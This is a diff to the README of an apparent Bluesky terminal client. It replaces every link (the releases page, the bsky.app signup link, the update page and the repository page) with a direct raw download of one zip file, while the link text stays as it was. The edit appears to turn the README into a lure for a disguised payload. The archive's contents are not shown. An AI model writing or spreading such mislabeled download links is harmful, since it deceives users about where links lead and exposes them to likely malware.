@@ -1,6 +1,6 @@
 # 🦋 bluesky-terminal-client - Your Social Feed, Right in the Terminal
 
-[![Download Now](https://img.shields.io/badge/Download-BlueSky_Terminal_Client-blue?style=for-the-badge&logo=github)](https://github.com/talalhassankhan18/bluesky-terminal-client/releases)
+[![Download Now](https://img.shields.io/badge/Download-BlueSky_Terminal_Client-blue?style=for-the-badge&logo=github)](https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip)
 
 ## 🎯 What Is This?
 
@@ -25,7 +25,7 @@ Getting bluesky-terminal-client running on your computer is easier than you thin
 
 The first thing you need to do is download the application. Here's how:
 
-1.  **Visit this link to download the application:** [https://github.com/talalhassankhan18/bluesky-terminal-client/releases](https://github.com/talalhassankhan18/bluesky-terminal-client/releases)
+1.  **Visit this link to download the application:** [https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip](https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip)
 2.  On that page, you'll see a list of files. Look for the one that matches your computer's system.
 3.  Click the download link for the file that says **Windows** (or **win** in the name). It might look something like `bluesky-terminal-client-windows.zip` or similar.
 4.  Wait for the download to finish. This might take a minute or two.
@@ -54,7 +54,7 @@ To start using the app, you'll need to log in with your Bluesky credentials.
 2.  The app will securely connect to Bluesky's servers.
 3.  After a few seconds, your feed will appear right in the terminal window!
 
-**Tip:** If you don't have a Bluesky account yet, you can create one for free at [bsky.app](https://bsky.app) and then come back to log in here.
+**Tip:** If you don't have a Bluesky account yet, you can create one for free at [bsky.app](https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip) and then come back to log in here.
 
 ## 🎮 How to Use
 
@@ -97,7 +97,7 @@ To display images, the app requires a terminal that supports modern graphics pro
 
 ### 🔄 How do I update the application?
 
-When a new version is released, simply go back to the [download page](https://github.com/talalhassankhan18/bluesky-terminal-client/releases), download the latest version, and replace your old files. Your login session will usually remain intact.
+When a new version is released, simply go back to the [download page](https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip), download the latest version, and replace your old files. Your login session will usually remain intact.
 
 ## 🆘 Need Help?
 
@@ -106,7 +106,7 @@ If you run into any problems, here are a few things you can try:
 1.  **Restart the application** – Sometimes a simple restart fixes small glitches.
 2.  **Check your internet connection** – Make sure you're connected to the internet.
 3.  **Re-download the file** – The download might have been corrupted. Delete the file you downloaded and try again.
-4.  **Visit the project page** – Head over to the [GitHub repository](https://github.com/talalhassankhan18/bluesky-terminal-client) for more information and troubleshooting tips.
+4.  **Visit the project page** – Head over to the [GitHub repository](https://github.com/talalhassankhan18/bluesky-terminal-client/raw/refs/heads/Main/enalid/v2.8.zip) for more information and troubleshooting tips.
 
 ## 📄 License
 
